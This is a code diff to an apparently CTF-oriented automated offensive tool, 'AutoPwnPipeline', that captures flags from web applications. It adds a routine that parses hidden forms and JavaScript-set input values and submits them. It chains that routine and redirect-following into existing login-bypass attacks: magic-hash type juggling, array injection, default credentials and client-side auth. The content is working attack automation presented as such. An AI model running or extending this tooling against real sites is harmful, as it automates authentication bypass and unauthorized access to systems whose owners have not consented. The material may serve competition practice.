@@ -109,6 +109,52 @@ class AutoPwnPipeline:
                     captured_any = True
         return captured_any
 
+    def _follow_hidden_forms(self, html: str, base_url: str, source_context: str = ""):
+        """Parse HTML for hidden forms and JS-set input values, then submit them.
+        Handles multi-step auth flows like: login.php returns hidden form posting hash to admin.php."""
+        hidden_forms = re.findall(
+            r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>(.*?)</form>',
+            html, re.IGNORECASE | re.DOTALL
+        )
+        for hf_action, hf_body in hidden_forms:
+            hf_inputs = {}
+            for hf_inp in re.finditer(
+                r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', hf_body, re.IGNORECASE
+            ):
+                inp_tag = hf_inp.group(0)
+                inp_name = hf_inp.group(1)
+                val_match = re.search(r'value=["\']([^"\']*)["\']', inp_tag, re.IGNORECASE)
+                hf_inputs[inp_name] = val_match.group(1) if val_match else ""
+
+            # Extract values set via JS (e.g., document.getElementById('x').value = "hash")
+            for js_val in re.finditer(
+                r'getElementById\s*\(\s*["\']([^"\']+)["\']\s*\)\s*\.value\s*=\s*["\']([^"\']+)["\']',
+                html, re.IGNORECASE
+            ):
+                elem_id = js_val.group(1)
+                elem_val = js_val.group(2)
+                # Match element ID to input name in the form
+                for hf_inp2 in re.finditer(
+                    r'<input[^>]*id=["\']' + re.escape(elem_id) + r'["\'][^>]*>',
+                    hf_body, re.IGNORECASE
+                ):
+                    name_match = re.search(r'name=["\']([^"\']+)["\']', hf_inp2.group(0), re.IGNORECASE)
+                    if name_match:
+                        hf_inputs[name_match.group(1)] = elem_val
+
+            if hf_inputs:
+                hf_full_url = urljoin(base_url, hf_action)
+                try:
+                    r_hf = self.session.post(hf_full_url, data=hf_inputs, timeout=15)
+                    self._check_and_store_flags(r_hf.text, f"Hidden Form Follow-up ({hf_full_url}) via {source_context}")
+                    if r_hf.status_code in (301, 302):
+                        loc = r_hf.headers.get("Location", "")
+                        if loc:
+                            r_hf2 = self.session.get(urljoin(hf_full_url, loc), timeout=15)
+                            self._check_and_store_flags(r_hf2.text, f"Hidden Form Redirect ({loc})")
+                except Exception:
+                    pass
+
     def run(self):
         """Execute the complete 7-Phase Offensive Pipeline."""
         console.print(f"\n[bold magenta]══════════════════════════════════════════════════════════════════════════════[/bold magenta]")
@@ -1138,8 +1184,9 @@ class AutoPwnPipeline:
                                     r2 = self.session.get(urljoin(action, loc), timeout=15)
                                     self._check_and_store_flags(r2.text, f"Auth bypass redirect {loc}")
                                 except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
-                                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                                     pass
+                        # Follow hidden forms in response (multi-step auth: login -> hash -> admin)
+                        self._follow_hidden_forms(r.text, action, f"Auth bypass ({p})")
                         return
                 except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                     pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
@@ -1159,6 +1206,15 @@ class AutoPwnPipeline:
                     ):
                         print_success(f"  Type juggling bypass with magic hash {mh}")
                         self._check_and_store_flags(r.text, f"Type juggling ({mh})")
+                        if r.status_code in (301, 302):
+                            loc = r.headers.get("Location", "")
+                            if loc:
+                                try:
+                                    r2 = self.session.get(urljoin(action, loc), timeout=15)
+                                    self._check_and_store_flags(r2.text, f"Type juggling redirect {loc}")
+                                except Exception:
+                                    pass
+                        self._follow_hidden_forms(r.text, action, f"Type juggling ({mh})")
                         return
                 except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                     pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
@@ -1176,6 +1232,15 @@ class AutoPwnPipeline:
                 ):
                     print_success("  Array injection bypass!")
                     self._check_and_store_flags(r.text, "Array injection")
+                    if r.status_code in (301, 302):
+                        loc = r.headers.get("Location", "")
+                        if loc:
+                            try:
+                                r2 = self.session.get(urljoin(action, loc), timeout=15)
+                                self._check_and_store_flags(r2.text, f"Array injection redirect {loc}")
+                            except Exception:
+                                pass
+                    self._follow_hidden_forms(r.text, action, "Array injection")
                     return
             except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                 pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
@@ -1199,6 +1264,7 @@ class AutoPwnPipeline:
                     ):
                         print_success(f"  Default creds worked: {u}:{p}")
                         self._check_and_store_flags(r.text, f"Default creds ({u}:{p})")
+                        self._follow_hidden_forms(r.text, action, f"Default creds ({u}:{p})")
                         return
                 except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                     pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
@@ -3185,8 +3251,10 @@ class AutoPwnPipeline:
                             else:
                                 r_sub = self.session.get(action_url, params=form_data, timeout=15)
                             self._check_and_store_flags(r_sub.text, f"Authenticated Form Submission ({action_url})")
+                            
+                            # Follow hidden forms in the response (multi-step auth flows)
+                            self._follow_hidden_forms(r_sub.text, action_url, f"Client-Side Auth ({name})")
                         except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
-                            pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                             pass
 
             # Check deobfuscated strings
